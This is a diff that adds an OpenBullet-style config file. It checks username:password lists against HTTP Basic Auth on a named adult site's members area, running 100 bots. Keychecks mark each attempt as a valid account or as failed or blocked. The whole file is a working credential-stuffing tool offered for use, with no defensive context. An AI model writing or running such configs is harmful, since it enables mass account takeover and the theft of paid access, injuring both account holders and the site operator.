@@ -1,0 +1,34 @@
+[SETTINGS]
+{
+  "Name": "18pussyclub",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-27T01:34:43.1905349+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "http://members.18pussyclub.com/index.php" BasicAuth 
+  USERNAME "<USER>" PASSWORD "<PASS>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Welcome to 18pussyclub.com VIP area!" 
+  KEYCHAIN Failure OR 
+    KEY "Area Error" 
+    KEY "temporarily blocked from" 
+    KEY "Authorization Required" 
